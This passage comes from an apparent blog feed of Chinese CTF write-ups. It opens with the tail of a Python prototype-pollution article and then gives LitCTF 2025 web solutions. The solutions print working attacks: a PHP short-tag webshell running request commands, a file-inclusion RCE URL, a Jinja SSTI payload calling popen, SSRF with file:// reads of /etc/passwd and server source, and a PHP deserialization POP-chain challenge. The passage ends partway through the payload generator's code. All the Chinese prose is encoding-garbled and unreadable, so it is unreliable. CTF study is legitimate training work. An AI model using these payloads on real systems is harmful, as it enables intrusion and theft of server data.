ï¼Œåˆ™è·¯å¾„ä¸Šçš„å¯¹è±¡å€¼ç”±å‡½æ•°æœ¬èº«å¤„ç†ã€‚</li><li><strong>è‡ªå®šä¹‰å‚æ•°</strong>ï¼š <code>customizer</code>  è¢«è°ƒç”¨æ—¶æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼š <code>(nested_value, key, nested_object)</code> ã€‚</li><li><strong>é€’å½’åˆ›å»ºè·¯å¾„</strong>ï¼šå‡½æ•°é€’å½’åœ°éå†  <code>path</code> ï¼Œåˆ›å»ºè·¯å¾„ä¸Šçš„å¯¹è±¡ï¼Œå¦‚æœè·¯å¾„ä¸Šçš„å¯¹è±¡ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨  <code>default_factory</code>  åˆ›å»ºã€‚</li><li><strong>æ›´æ–°æœ€ç»ˆå€¼</strong>ï¼šéå†å®Œæˆåï¼Œä½¿ç”¨  <code>updater</code>  æ›´æ–°è·¯å¾„æœ€ç»ˆä½ç½®ä¸Šçš„å€¼ã€‚</li><li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå¦‚æœåœ¨è·å–æˆ–è®¾ç½®è·¯å¾„ä¸Šçš„å€¼æ—¶é‡åˆ°  <code>TypeError</code> ï¼Œå‡½æ•°ä¼šå°è¯•ä½¿ç”¨æ•´æ•°ç´¢å¼•è®¿é—®ï¼Œå¦‚æœä»ç„¶å¤±è´¥ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</li><li><strong>åŸåœ°ä¿®æ”¹</strong>ï¼š <code>obj</code>  æ˜¯ç›´æ¥åœ¨åŸå¯¹è±¡ä¸Šè¿›è¡Œä¿®æ”¹çš„ï¼Œè€Œä¸æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚</li><li><strong>è¿”å›å€¼</strong>ï¼šå‡½æ•°è¿”å›ä¿®æ”¹åçš„  <code>obj</code> ã€‚</li></ol><p>â€‹ç®€è€Œè¨€ä¹‹ï¼Œ <code>update_with</code>  å‡½æ•°æ ¹æ®æä¾›çš„è·¯å¾„ï¼Œä½¿ç”¨è‡ªå®šä¹‰é€»è¾‘é€’å½’åœ°åˆ›å»ºæˆ–æ›´æ–°ä¸€ä¸ªåµŒå¥—çš„åˆ—è¡¨æˆ–å­—å…¸ä¸­çš„å€¼ï¼Œå¹¶åœ¨è·¯å¾„çš„æœ€ç»ˆä½ç½®åº”ç”¨ä¸€ä¸ªæ›´æ–°å‡½æ•°ã€‚</p><h1 id="å‚è€ƒæ–‡ç« "><a class="markdownIt-Anchor" href="#å‚è€ƒæ–‡ç« ">#</a> å‚è€ƒæ–‡ç« ï¼š</h1><h2 id="åŸºç¡€èµ„æ–™"><a class="markdownIt-Anchor" href="#åŸºç¡€èµ„æ–™">#</a> åŸºç¡€èµ„æ–™</h2><p><span class="exturl" data-url="aHR0cHM6Ly9wYXp1cmlzLmNuLzIwMjMvMDcvMjcvUHl0aG9uJUU1JThFJTlGJUU1JTlFJThCJUU5JTkzJUJFJUU2JUIxJUExJUU2JTlGJTkzLw==">Python åŸå‹é“¾æ±¡æŸ“</span></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTg3Ni8jdG9jX180">Python åŸå‹é“¾æ±¡æŸ“å˜ä½“ (prototype-pollution-in-python)</span></strong></p><p><span class="exturl" data-url="aHR0cHM6Ly9mdXJpbmEub3JnLmNuLzIwMjMvMTIvMTgvcHJvdG90eXBlLXBvbGx1dGlvbi1pbi1weWRhc2gtY3RmLyMlRTQlQkIlQTMlRTclQTAlODElRTglQjAlODMlRTglQUYlOTU=">Pydash åŸå‹é“¾æ±¡æŸ“</span></p><h2 id="åšé¢˜å‚è€ƒ"><a class="markdownIt-Anchor" href="#åšé¢˜å‚è€ƒ">#</a> åšé¢˜å‚è€ƒï¼š</h2><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTQ2MjA/dGltZV9fMTMxMT1HcUFoWUswS0JLOEQlMkZEMGx0ZEdRNTVNRFJvdEl0ZUQ=">ä» CISCN2024 çš„ sanic å¼•å‘å¯¹ python â€œåŸå‹é“¾â€ çš„æ±¡æŸ“æŒ–æ˜</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3huZ3huZ3huL3AvMTgyMDUyMzU=">CISCN2024-WEB-Sanic gxngxngxn    </span></p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€2025ã€‘LitCTF</title>
      <link href="/posts/a4378bd0.html"/>
      <url>/posts/a4378bd0.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web</h1><h2 id="litctf-2025easy_file"><a class="markdownIt-Anchor" href="#litctf-2025easy_file">#</a> [LitCTF 2025]easy_file</h2><p>â€‹ç™»å½•æ¡†å¼±å¯†ç çˆ†ç ´ä¸º admin:passwordï¼Œä¹‹åè·³è½¬åˆ°æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œåªèƒ½ä¸Šä¼ å¤´åƒï¼Œå¹¶ä¸” php è¢«è¿‡æ»¤ï¼ŒçŸ­æ ‡ç­¾ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹js é‡Œé¢å­˜åœ¨æç¤ºï¼Œè¯´ file æŸ¥çœ‹å¤´åƒï¼Œä¼°è®¡æ˜¯å¯ä»¥æ–‡ä»¶åŒ…å«ã€‚ç›´æ¥ä¼ ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?file=uploads/a.jpg<span class="built_in">&amp;</span>cmd=tac f*</span><br></pre></td></tr></table></figure><p>â€‹è¿›è¡Œ rceã€‚</p><h2 id="litctf-2025nest_js"><a class="markdownIt-Anchor" href="#litctf-2025nest_js">#</a> [LitCTF 2025]nest_js</h2><p>â€‹ç™»å½•æ¡†å¼±å¯†ç çˆ†ç ´è¿˜æ˜¯ admin:passwordï¼Œç™»å½•ç›´æ¥å¾—åˆ° flag</p><h2 id="litctf-2025æ˜Ÿæ„¿ä¿¡ç®±"><a class="markdownIt-Anchor" href="#litctf-2025æ˜Ÿæ„¿ä¿¡ç®±">#</a> [LitCTF 2025] æ˜Ÿæ„¿ä¿¡ç®±</h2><p>â€‹wappalyzer æ’ä»¶çœ‹åˆ°æ˜¯ flask æ¡†æ¶ï¼Œ è¾“å…¥ asd çš„æ—¶å€™å›æ˜¾ asdï¼Œå¯èƒ½æ˜¯ sstiï¼Œè¾“å…¥ <code>&#123;%print(123)%&#125;</code>  æˆåŠŸè¾“å‡º 123ï¼Œå¼€å§‹æµ‹è¯•ã€‚</p><p>â€‹ <code>&#123;&#123; &#125;&#125;</code>  è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯ <code>&#123;% %&#125;</code>  æ²¡æœ‰è¢«è¿‡æ»¤å°è¯•ä¸‹è¿™ä¸ª payloadï¼Œè¿™ä¸ªåŸºç¡€ payload æ¯”è¾ƒå¸¸è§„ï¼Œç”šè‡³é‡Œé¢æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">% print().__class__.__base__.__subclasses__()[n].__init__.__globals__[&#x27;popen&#x27;](&quot;base64 /flag&quot;).read() %&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹æŠŠ <code>__subclasses__()[n]</code>  é‡Œçš„ n ç”¨ burp çˆ†ç ´ï¼Œæœ€å¥½å‘ç° 137 è¯»åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">% print().__class__.__base__.__subclasses__()[137].__init__.__globals__[&#x27;popen&#x27;](&quot;base64 /flag&quot;).read() %&#125;</span></span><br></pre></td></tr></table></figure><h2 id="litctf-2025easy_signin"><a class="markdownIt-Anchor" href="#litctf-2025easy_signin">#</a> [LitCTF 2025]easy_signin</h2><p>â€‹æ‰«åå°ï¼Œæ‰«åˆ°äº† <code>login.html</code>  è®¿é—®æ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œè¯»æºç å‘ç°äº†ä¸€ä¸ªç‚¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> secretKey = <span class="string">&#x27;easy_signin&#x27;</span>;  </span><br><span class="line"><span class="keyword">const</span> sign = <span class="title class_">CryptoJS</span>.<span class="title class_">MD5</span>(shortMd5User + shortMd5Pass + timestamp + secretKey).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;login.php&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;X-Sign&#x27;</span>: sign  </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">            <span class="attr">username</span>: md5Username,   </span><br><span class="line">            <span class="attr">password</span>: md5Password,   </span><br><span class="line">            <span class="attr">timestamp</span>: timestamp</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>â€‹è´¦å·å¯†ç æ˜¯ md5 åŠ å¯†çš„ï¼Œburp æŠ“åŒ…ç™»å½•ï¼Œç»™ user æ”¹æˆ admin çš„ md5ï¼š <code>21232f297a57a5a743894a0e4a801fc3</code> ï¼Œç„¶åçˆ†ç ´å¯†ç ï¼Œè®°å¾—å¯†ç ä¹Ÿè¦ md5 åŠ å¯†ï¼Œå¯†ç æ²¡ç»“æœï¼Œè‡³å°‘æˆ‘å­—å…¸æ²¡å‡ºæ¥ï¼Œé‚£å°±æ¢ä¸ªæ€è·¯ï¼Œå‰é¢å‘ç°ä¸€ä¸ªæ–‡ä»¶å¯ä»¥è®¿é—®ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;api.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œ api.js åº”è¯¥æ˜¯æœåŠ¡å™¨æœ¬åœ°çš„ï¼Œè®¿é—®å¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=</span><br></pre></td></tr></table></figure><p>â€‹æ­£å¥½æ‰«ç›®å½•çš„æ—¶å€™å­˜åœ¨ /apiï¼Œé‚£ä¹ˆå¯ä»¥è¯•è¯•çœ‹è¿™ä¸ªèƒ½å¹²å•¥ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=http://www.baidu.com</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥è¿›è¡Œ ssrfï¼ŒæˆåŠŸè®¿é—®åˆ°äº†ç™¾åº¦ï¼Œå†å›å»çœ‹ç™»å½•é¡µæºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (result.<span class="property">code</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;ç™»å½•æˆåŠŸï¼&#x27;</span>);</span><br><span class="line">                    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;dashboard.php&#x27;</span>; </span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°ç™»å½•æˆåŠŸåˆ™è·³è½¬ <code>dashboard.php</code> ï¼Œä½†æ˜¯è®¿é—®å¾—åˆ°çš„æ˜¯ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=http://127.0.0.1/dashboard.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="params">#</span>ç»“æœï¼š</span><br><span class="line">çœ‹ä¸è§å“¦</span><br></pre></td></tr></table></figure><p>â€‹è¯•å›¾ä½¿ç”¨ <code>php://filter</code>  å‘ç°ç›´æ¥ <code>ç¦æ­¢è®¿é—®ï¼šä¸å…è®¸ä½¿ç”¨ php:// åè®®</code> ï¼Œç”¨ file ä¸ä¼šï¼Œè¯•å›¾è®¿é—®ä¸‹ <code>/etc/passwd</code>  æˆåŠŸè®¿é—®åˆ°ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=file:///etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯ <code>dashboard.php</code> ï¼Œç”¨æ’ä»¶å‘ç°æ˜¯ nginx æ¡†æ¶ï¼Œæ¨æµ‹ç›®å½•æ˜¯ <code>/var/www/html</code> ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=file:///var/www/html/dashboard.php</span><br><span class="line"></span><br><span class="line">çœ‹ä¸è§å“¦</span><br></pre></td></tr></table></figure><p>â€‹emmï¼Œåº”è¯¥æ˜¯è¿™ä¸ªæ–‡ä»¶çš„é—®é¢˜ï¼Œæ¢ä¸ª php æ–‡ä»¶å°±èƒ½çœ‹åˆ°ä¿¡æ¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=file:<span class="comment">///var/www/html/api/sys/urlcode.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$forbidden_protocols</span> = [<span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;zlib://&#x27;</span>, <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;glob://&#x27;</span>, <span class="string">&#x27;phar://&#x27;</span>, <span class="string">&#x27;ssh2://&#x27;</span>, <span class="string">&#x27;rar://&#x27;</span>, <span class="string">&#x27;ogg://&#x27;</span>, <span class="string">&#x27;expect://&#x27;</span>];</span><br><span class="line">    <span class="variable">$protocol_block</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$forbidden_protocols</span> <span class="keyword">as</span> <span class="variable">$proto</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="variable">$proto</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="variable">$protocol_block</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$log_block</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;.log&#x27;</span>) !== <span class="literal">false</span>;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$protocol_block</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç¦æ­¢è®¿é—®ï¼šä¸å…è®¸ä½¿ç”¨ <span class="subst">&#123;$proto&#125;</span> åè®®&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$log_block</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç¦æ­¢è®¿é—®ï¼šURL åŒ…å« .log&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;login.php&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;dashboard.php&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;327a6c4304ad5938eaf0efb6cc3e53dc.php&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;çœ‹ä¸è§å“¦&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;&quot;</span>.<span class="variable">$url</span>.<span class="string">&quot; çš„å¿«ç…§å¦‚ä¸‹ï¼š&lt;/b&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹å‘ç°ç¦æ­¢è®¿é—®ï¼š <code>327a6c4304ad5938eaf0efb6cc3e53dc.php</code>  å’Œ <code>dashboard.php</code> ã€‚ã€‚ã€‚å¥½æ°”å•Šã€‚</p><p>â€‹è¿™é‡Œç›´æ¥è®¿é—®ä¸‹è¿™ä¸ªä¹±ç ä¸€æ ·çš„æ–‡ä»¶çœ‹çœ‹ï¼Œæ‹¿åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;d1bec3ad-9f2a-426f-9794-aed548ec03db&#125;</span><br></pre></td></tr></table></figure><h2 id="litctf-2025å›ã®åã¯"><a class="markdownIt-Anchor" href="#litctf-2025å›ã®åã¯">#</a> [LitCTF 2025] å›ã®åã¯</h2><p>â€‹è¿™ä¸ªé¢˜æˆ‘å°±è´´ä¸ªå¤§ä½¬çš„ payload å§</p><p>â€‹ååºåˆ—åŒ– pop é“¾çš„é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æŠŠOæ”¹æˆCä¸å°±è¡Œäº†å—,ç¬¨è›‹!ï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜†&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è´´ä¸ªç”Ÿæˆ payload çš„ä»£ç ï¼Œæ³¨æ„ï¼Œå¿…é¡»ç”¨<strong> 7.3.4</strong> ç‰ˆæœ¬çš„ php æ‰èƒ½ç”Ÿæˆ C å¼€å¤´çš„é“¾å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magic</span> = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span 